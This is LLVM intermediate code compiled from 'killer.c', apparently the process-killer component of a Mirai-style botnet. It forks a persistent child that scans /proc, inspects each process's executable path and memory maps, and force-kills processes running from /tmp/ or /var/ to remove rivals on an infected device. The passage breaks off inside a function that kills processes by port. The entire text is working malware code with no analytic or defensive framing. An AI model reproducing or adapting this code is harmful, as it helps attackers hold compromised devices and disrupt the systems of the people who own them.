; ModuleID = 'killer.c'
source_filename = "killer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.dirent = type { i64, i64, i16, i8, [256 x i8] }
%struct.__dirstream = type opaque

@.str = private unnamed_addr constant [7 x i8] c"/proc/\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"/exe\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"/maps\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"[heap]\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"r--p\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"rw-p\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"/numa_maps\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"default\00", align 1
@self = dso_local global i32 0, align 4
@SelfBuffer = dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@mainpid = dso_local global i32 0, align 4
@maintain_thread = dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.11 = private unnamed_addr constant [4 x i8] c".so\00", align 1
@pid1 = dso_local global i32 0, align 4
@pid2 = dso_local global i32 0, align 4
@scanner_pid = dso_local global i32 0, align 4
@spid = dso_local global i32 0, align 4
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @ChangePath(i8* %0, i8* %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i8* %2, i8** %6, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i8* @strcpy(i8* %7, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0)) #6
  %9 = load i8*, i8** %4, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = call i8* @strcat(i8* %9, i8* %10) #6
  %12 = load i8*, i8** %4, align 8
  %13 = load i8*, i8** %6, align 8
  %14 = call i8* @strcat(i8* %12, i8* %13) #6
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @ExeBuffer(i8* %0, i8* %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  %9 = load i8*, i8** %6, align 8
  %10 = load i8*, i8** %7, align 8
  call void @ChangePath(i8* %9, i8* %10, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %11 = load i8*, i8** %6, align 8
  %12 = load i8*, i8** %5, align 8
  %13 = call i64 @readlink(i8* %11, i8* %12, i64 1024) #6
  %14 = trunc i64 %13 to i32
  store i32 %14, i32* %8, align 4
  %15 = icmp slt i32 %14, 1
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 -1, i32* %4, align 4
  br label %23

17:                                               ; preds = %3
  %18 = load i8*, i8** %5, align 8
  %19 = load i32, i32* %8, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 0, i8* %21, align 1
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %4, align 4
  br label %23

23:                                               ; preds = %17, %16
  %24 = load i32, i32* %4, align 4
  ret i32 %24
}

; Function Attrs: nounwind
declare i64 @readlink(i8*, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @MapBuffer(i8* %0, i8* %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  %10 = load i8*, i8** %6, align 8
  %11 = load i8*, i8** %7, align 8
  call void @ChangePath(i8* %10, i8* %11, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  %12 = load i8*, i8** %6, align 8
  %13 = call i32 (i8*, i32, ...) @open(i8* %12, i32 0)
  store i32 %13, i32* %8, align 4
  %14 = icmp slt i32 %13, 0
  br i1 %14, label %15, label %16

15:                                               ; preds = %3
  store i32 -1, i32* %4, align 4
  br label %58

16:                                               ; preds = %3
  %17 = load i32, i32* %8, align 4
  %18 = load i8*, i8** %5, align 8
  %19 = call i64 @read(i32 %17, i8* %18, i64 1024)
  %20 = icmp slt i64 %19, 1
  br i1 %20, label %21, label %24

21:                                               ; preds = %16
  %22 = load i32, i32* %8, align 4
  %23 = call i32 @close(i32 %22)
  store i32 -1, i32* %4, align 4
  br label %58

24:                                               ; preds = %16
  %25 = load i8*, i8** %5, align 8
  %26 = call i32 @mem_exists(i8* %25, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  store i32 %26, i32* %9, align 4
  %27 = load i32, i32* %9, align 4
  %28 = icmp ne i32 %27, -1
  br i1 %28, label %29, label %34

29:                                               ; preds = %24
  %30 = load i8*, i8** %5, align 8
  %31 = load i32, i32* %9, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  store i8 0, i8* %33, align 1
  br label %55

34:                                               ; preds = %24
  %35 = load i8*, i8** %5, align 8
  %36 = call i32 @mem_exists(i8* %35, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  store i32 %36, i32* %9, align 4
  %37 = load i32, i32* %9, align 4
  %38 = icmp ne i32 %37, -1
  br i1 %38, label %39, label %44

39:                                               ; preds = %34
  %40 = load i32, i32* %9, align 4
  %41 = load i8*, i8** %5, align 8
  %42 = sext i32 %40 to i64
  %43 = getelementptr inbounds i8, i8* %41, i64 %42
  store i8* %43, i8** %5, align 8
  br label %44

44:                                               ; preds = %39, %34
  %45 = load i8*, i8** %5, align 8
  %46 = call i32 @mem_exists(i8* %45, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  store i32 %46, i32* %9, align 4
  %47 = load i32, i32* %9, align 4
  %48 = icmp ne i32 %47, -1
  br i1 %48, label %49, label %54

49:                                               ; preds = %44
  %50 = load i8*, i8** %5, align 8
  %51 = load i32, i32* %9, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  store i8 0, i8* %53, align 1
  br label %54

54:                                               ; preds = %49, %44
  br label %55

55:                                               ; preds = %54, %29
  %56 = load i32, i32* %8, align 4
  %57 = call i32 @close(i32 %56)
  store i32 1, i32* %4, align 4
  br label %58

58:                                               ; preds = %55, %21, %15
  %59 = load i32, i32* %4, align 4
  ret i32 %59
}

declare i32 @open(i8*, i32, ...) #2

declare i64 @read(i32, i8*, i64) #2

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @mem_exists(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

8:                                                ; preds = %40, %2
  %9 = load i32, i32* %6, align 4
  %10 = sext i32 %9 to i64
  %11 = load i8*, i8** %4, align 8
  %12 = call i64 @strlen(i8* %11) #7
  %13 = icmp ult i64 %10, %12
  br i1 %13, label %14, label %43

14:                                               ; preds = %8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = load i8*, i8** %5, align 8
  %18 = call i64 @strlen(i8* %17) #7
  %19 = icmp eq i64 %16, %18
  br i1 %19, label %20, label %22

20:                                               ; preds = %14
  %21 = load i32, i32* %6, align 4
  store i32 %21, i32* %3, align 4
  br label %44

22:                                               ; preds = %14
  %23 = load i8*, i8** %4, align 8
  %24 = load i32, i32* %6, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i8, i8* %26, align 1
  %28 = sext i8 %27 to i32
  %29 = load i8*, i8** %5, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %28, %34
  br i1 %35, label %36, label %39

36:                                               ; preds = %22
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  br label %40

39:                                               ; preds = %22
  store i32 0, i32* %7, align 4
  br label %40

40:                                               ; preds = %39, %36
  %41 = load i32, i32* %6, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %6, align 4
  br label %8, !llvm.loop !6

43:                                               ; preds = %8
  store i32 -1, i32* %3, align 4
  br label %44

44:                                               ; preds = %43, %20
  %45 = load i32, i32* %3, align 4
  ret i32 %45
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @NumaMapBuffer(i8* %0, i8* %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  %9 = load i8*, i8** %6, align 8
  %10 = load i8*, i8** %7, align 8
  call void @ChangePath(i8* %9, i8* %10, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0))
  %11 = load i8*, i8** %6, align 8
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %8, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %15

14:                                               ; preds = %3
  store i32 -1, i32* %4, align 4
  br label %28

15:                                               ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = load i8*, i8** %5, align 8
  %18 = call i64 @read(i32 %16, i8* %17, i64 1024)
  %19 = icmp eq i64 %18, -1
  br i1 %19, label %20, label %23

20:                                               ; preds = %15
  %21 = load i32, i32* %8, align 4
  %22 = call i32 @close(i32 %21)
  store i32 -1, i32* %4, align 4
  br label %28

23:                                               ; preds = %15
  %24 = load i8*, i8** %5, align 8
  %25 = call i32 @getPOS(i8* %24, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  %26 = load i32, i32* %8, align 4
  %27 = call i32 @close(i32 %26)
  store i32 1, i32* %4, align 4
  br label %28

28:                                               ; preds = %23, %20, %14
  %29 = load i32, i32* %4, align 4
  ret i32 %29
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getPOS(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %9 = load i8*, i8** %5, align 8
  %10 = call i64 @strlen(i8* %9) #7
  %11 = sub i64 %10, 1
  %12 = trunc i64 %11 to i32
  store i32 %12, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @mem_exists(i8* %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i64 0, i64 0))
  store i32 %14, i32* %8, align 4
  %15 = icmp ne i32 %14, -1
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  store i8 0, i8* %20, align 1
  br label %22

21:                                               ; preds = %2
  store i32 -1, i32* %3, align 4
  br label %64

22:                                               ; preds = %16
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #7
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %7, align 4
  br label %26

26:                                               ; preds = %60, %22
  %27 = load i32, i32* %7, align 4
  %28 = icmp sgt i32 %27, -1
  br i1 %28, label %29, label %63

29:                                               ; preds = %26
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %38

32:                                               ; preds = %29
  %33 = load i8*, i8** %4, align 8
  %34 = load i32, i32* %7, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  store i8 0, i8* %36, align 1
  %37 = load i32, i32* %7, align 4
  store i32 %37, i32* %3, align 4
  br label %64

38:                                               ; preds = %29
  %39 = load i8*, i8** %4, align 8
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = load i8*, i8** %5, align 8
  %46 = load i32, i32* %6, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %44, %50
  br i1 %51, label %52, label %55

52:                                               ; preds = %38
  %53 = load i32, i32* %6, align 4
  %54 = add nsw i32 %53, -1
  store i32 %54, i32* %6, align 4
  br label %60

55:                                               ; preds = %38
  %56 = load i8*, i8** %5, align 8
  %57 = call i64 @strlen(i8* %56) #7
  %58 = sub i64 %57, 1
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %6, align 4
  br label %60

60:                                               ; preds = %55, %52
  %61 = load i32, i32* %7, align 4
  %62 = add nsw i32 %61, -1
  store i32 %62, i32* %7, align 4
  br label %26, !llvm.loop !8

63:                                               ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %64

64:                                               ; preds = %63, %32, %21
  %65 = load i32, i32* %3, align 4
  ret i32 %65
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @KillProccess() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.dirent*, align 8
  %5 = alloca %struct.__dirstream*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [512 x i8], align 16
  %10 = alloca [2048 x i8], align 16
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store %struct.dirent* null, %struct.dirent** %4, align 8
  %11 = load i32, i32* @self, align 4
  %12 = icmp eq i32 %11, 0
  br i1 %12, label %13, label %25

13:                                               ; preds = %0
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0), i8** %6, align 8
  %14 = load i8*, i8** %6, align 8
  %15 = call i32 (i8*, i32, ...) @open(i8* %14, i32 0)
  store i32 %15, i32* %3, align 4
  %16 = load i32, i32* %3, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %18, label %24

18:                                               ; preds = %13
  %19 = load i32, i32* %3, align 4
  %20 = call i32 @close(i32 %19)
  %21 = load i8*, i8** %6, align 8
  %22 = load i8*, i8** @SelfBuffer, align 8
  %23 = call i64 @readlink(i8* %21, i8* %22, i64 100) #6
  store i32 1, i32* @self, align 4
  br label %24

24:                                               ; preds = %18, %13
  br label %25

25:                                               ; preds = %24, %0
  br label %26

26:                                               ; preds = %25, %133
  %27 = load i32, i32* %1, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %1, align 4
  %29 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store %struct.__dirstream* %29, %struct.__dirstream** %5, align 8
  %30 = icmp eq %struct.__dirstream* %29, null
  br i1 %30, label %31, label %32

31:                                               ; preds = %26
  br label %134

32:                                               ; preds = %26
  br label %33

33:                                               ; preds = %126, %64, %49, %32
  %34 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %35 = call %struct.dirent* @readdir(%struct.__dirstream* %34)
  store %struct.dirent* %35, %struct.dirent** %4, align 8
  %36 = icmp ne %struct.dirent* %35, null
  br i1 %36, label %37, label %127

37:                                               ; preds = %33
  %38 = load %struct.dirent*, %struct.dirent** %4, align 8
  %39 = getelementptr inbounds %struct.dirent, %struct.dirent* %38, i32 0, i32 4
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %39, i64 0, i64 0
  %41 = call i32 @atoi(i8* %40) #7
  store i32 %41, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %42 = load i32, i32* %7, align 4
  %43 = load i32, i32* @mainpid, align 4
  %44 = icmp eq i32 %42, %43
  br i1 %44, label %49, label %45

45:                                               ; preds = %37
  %46 = load i32, i32* %7, align 4
  %47 = load i32, i32* @maintain_thread, align 4
  %48 = icmp eq i32 %46, %47
  br i1 %48, label %49, label %50

49:                                               ; preds = %45, %37
  br label %33, !llvm.loop !9

50:                                               ; preds = %45
  %51 = load %struct.dirent*, %struct.dirent** %4, align 8
  %52 = getelementptr inbounds %struct.dirent, %struct.dirent* %51, i32 0, i32 4
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %52, i64 0, i64 0
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp slt i32 %55, 48
  br i1 %56, label %64, label %57

57:                                               ; preds = %50
  %58 = load %struct.dirent*, %struct.dirent** %4, align 8
  %59 = getelementptr inbounds %struct.dirent, %struct.dirent* %58, i32 0, i32 4
  %60 = getelementptr inbounds [256 x i8], [256 x i8]* %59, i64 0, i64 0
  %61 = load i8, i8* %60, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %64, label %65

64:                                               ; preds = %57, %50
  br label %33, !llvm.loop !9

65:                                               ; preds = %57
  br label %66

66:                                               ; preds = %123, %65
  %67 = load i32, i32* %8, align 4
  %68 = icmp ne i32 %67, 3
  br i1 %68, label %69, label %126

69:                                               ; preds = %66
  %70 = bitcast [512 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %70, i8 0, i64 512, i1 false)
  %71 = bitcast [2048 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %71, i8 0, i64 2048, i1 false)
  %72 = load i32, i32* %8, align 4
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %74, label %84

74:                                               ; preds = %69
  %75 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %77 = load %struct.dirent*, %struct.dirent** %4, align 8
  %78 = getelementptr inbounds %struct.dirent, %struct.dirent* %77, i32 0, i32 4
  %79 = getelementptr inbounds [256 x i8], [256 x i8]* %78, i64 0, i64 0
  %80 = call i32 @ExeBuffer(i8* %75, i8* %76, i8* %79)
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %83

82:                                               ; preds = %74
  br label %126

83:                                               ; preds = %74
  br label %84

84:                                               ; preds = %83, %69
  %85 = load i32, i32* %8, align 4
  %86 = icmp eq i32 %85, 1
  br i1 %86, label %87, label %97

87:                                               ; preds = %84
  %88 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  %89 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %90 = load %struct.dirent*, %struct.dirent** %4, align 8
  %91 = getelementptr inbounds %struct.dirent, %struct.dirent* %90, i32 0, i32 4
  %92 = getelementptr inbounds [256 x i8], [256 x i8]* %91, i64 0, i64 0
  %93 = call i32 @MapBuffer(i8* %88, i8* %89, i8* %92)
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %95, label %96

95:                                               ; preds = %87
  br label %126

96:                                               ; preds = %87
  br label %97

97:                                               ; preds = %96, %84
  %98 = load i32, i32* %8, align 4
  %99 = icmp eq i32 %98, 2
  br i1 %99, label %100, label %110

100:                                              ; preds = %97
  %101 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  %102 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %103 = load %struct.dirent*, %struct.dirent** %4, align 8
  %104 = getelementptr inbounds %struct.dirent, %struct.dirent* %103, i32 0, i32 4
  %105 = getelementptr inbounds [256 x i8], [256 x i8]* %104, i64 0, i64 0
  %106 = call i32 @NumaMapBuffer(i8* %101, i8* %102, i8* %105)
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

108:                                              ; preds = %100
  br label %126

109:                                              ; preds = %100
  br label %110

110:                                              ; preds = %109, %97
  %111 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  %112 = call i32 @mem_exists(i8* %111, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0))
  %113 = icmp ne i32 %112, -1
  br i1 %113, label %118, label %114

114:                                              ; preds = %110
  %115 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  %116 = call i32 @mem_exists(i8* %115, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0))
  %117 = icmp ne i32 %116, -1
  br i1 %117, label %118, label %123

118:                                              ; preds = %114, %110
  %119 = load i32, i32* %2, align 4
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %2, align 4
  %121 = load i32, i32* %7, align 4
  %122 = call i32 @kill(i32 %121, i32 9) #6
  br label %126

123:                                              ; preds = %114
  %124 = load i32, i32* %8, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %8, align 4
  br label %66, !llvm.loop !10

126:                                              ; preds = %118, %108, %95, %82, %66
  br label %33, !llvm.loop !9

127:                                              ; preds = %33
  %128 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %129 = call i32 @closedir(%struct.__dirstream* %128)
  %130 = load i32, i32* %1, align 4
  %131 = icmp eq i32 %130, 1
  br i1 %131, label %132, label %133

132:                                              ; preds = %127
  br label %134

133:                                              ; preds = %127
  br label %26

134:                                              ; preds = %132, %31
  ret void
}

declare %struct.__dirstream* @opendir(i8*) #2

declare %struct.dirent* @readdir(%struct.__dirstream*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

declare i32 @closedir(%struct.__dirstream*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @process_killer() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.dirent*, align 8
  %5 = alloca %struct.__dirstream*, align 8
  %6 = call i32 @fork() #6
  store i32 %6, i32* @maintain_thread, align 4
  %7 = load i32, i32* @maintain_thread, align 4
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %12, label %9

9:                                                ; preds = %0
  %10 = load i32, i32* @maintain_thread, align 4
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %9, %0
  br label %66

13:                                               ; preds = %9
  call void @KillProccess()
  br label %14

14:                                               ; preds = %13, %65
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  store %struct.dirent* null, %struct.dirent** %4, align 8
  %15 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store %struct.__dirstream* %15, %struct.__dirstream** %5, align 8
  %16 = icmp eq %struct.__dirstream* %15, null
  br i1 %16, label %17, label %18

17:                                               ; preds = %14
  br label %66

18:                                               ; preds = %14
  br label %19

19:                                               ; preds = %23, %18
  %20 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %21 = call %struct.dirent* @readdir(%struct.__dirstream* %20)
  store %struct.dirent* %21, %struct.dirent** %4, align 8
  %22 = icmp ne %struct.dirent* %21, null
  br i1 %22, label %23, label %26

23:                                               ; preds = %19
  %24 = load i32, i32* %1, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %1, align 4
  br label %19, !llvm.loop !11

26:                                               ; preds = %19
  %27 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %28 = call i32 @closedir(%struct.__dirstream* %27)
  br label %29

29:                                               ; preds = %26, %64
  store i32 0, i32* %2, align 4
  %30 = load i32, i32* %3, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store %struct.__dirstream* %32, %struct.__dirstream** %5, align 8
  %33 = icmp eq %struct.__dirstream* %32, null
  br i1 %33, label %34, label %35

34:                                               ; preds = %29
  br label %65

35:                                               ; preds = %29
  br label %36

36:                                               ; preds = %40, %35
  %37 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %38 = call %struct.dirent* @readdir(%struct.__dirstream* %37)
  store %struct.dirent* %38, %struct.dirent** %4, align 8
  %39 = icmp ne %struct.dirent* %38, null
  br i1 %39, label %40, label %43

40:                                               ; preds = %36
  %41 = load i32, i32* %2, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %2, align 4
  br label %36, !llvm.loop !12

43:                                               ; preds = %36
  %44 = load i32, i32* %1, align 4
  %45 = load i32, i32* %2, align 4
  %46 = icmp sgt i32 %44, %45
  br i1 %46, label %47, label %50

47:                                               ; preds = %43
  call void @KillProccess()
  %48 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %49 = call i32 @closedir(%struct.__dirstream* %48)
  br label %65

50:                                               ; preds = %43
  %51 = load i32, i32* %1, align 4
  %52 = load i32, i32* %2, align 4
  %53 = icmp slt i32 %51, %52
  br i1 %53, label %54, label %57

54:                                               ; preds = %50
  call void @KillProccess()
  %55 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %56 = call i32 @closedir(%struct.__dirstream* %55)
  br label %65

57:                                               ; preds = %50
  %58 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %59 = call i32 @closedir(%struct.__dirstream* %58)
  %60 = load i32, i32* %3, align 4
  %61 = icmp eq i32 %60, 10
  br i1 %61, label %62, label %64

62:                                               ; preds = %57
  %63 = call i32 @sleep(i32 1)
  store i32 0, i32* %3, align 4
  br label %64

64:                                               ; preds = %62, %57
  br label %29

65:                                               ; preds = %54, %47, %34
  br label %14

66:                                               ; preds = %12, %17
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

declare i32 @sleep(i32) #2

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local signext i8 @killer_kill_by_port(i16 zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i16, align 2
  %4 = alloca %struct.__dirstream*, align 8
  %5 = alloca %struct.__dirstream*, align 8
  %6 = alloca %struct.dirent*, align 8
  %7 = alloca %struct.dirent*, align 8
  %8 = alloca [4096 x i8], align 16
  %9 = alloca [4096 x i8], align 16
  %10 = alloca [513 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca [16 x i8], align 16
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca [16 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  store i16 %0, i16* %3, align 2
  %23 = bitcast [4096 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %23, i8 0, i64 4096, i1 false)
  %24 = bitcast [4096 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %24, i8 0, i64 4096, i1 false)
  %25 = bitcast [513 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %25, i8 0, i64 513, i1 false)
  store i32 0, i32* %11, align 4
  %26 = bitcast [16 x i8]* %12 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %26, i8 0, i64 16, i1 false)
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %27, i8** %13, align 8
  store i32 0, i32* %14, align 4
  %28 = load i16, i16* %3, align 2
  %29 = call zeroext i16 @ntohs(i16 zeroext %28) #8
  %30 = zext i16 %29 to i32
  %31 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 0
  %32 = call i8* @util_itoa(i32 %30, i32 16, i8* %31)
  %33 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 0
  %34 = call i32 @util_strlen(i8* %33)
  %35 = icmp eq i32 %34, 2
  br i1 %35, label %36, label %46

36:                                               ; preds = %1
  %37 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 0
  %38 = load i8, i8* %37, align 16
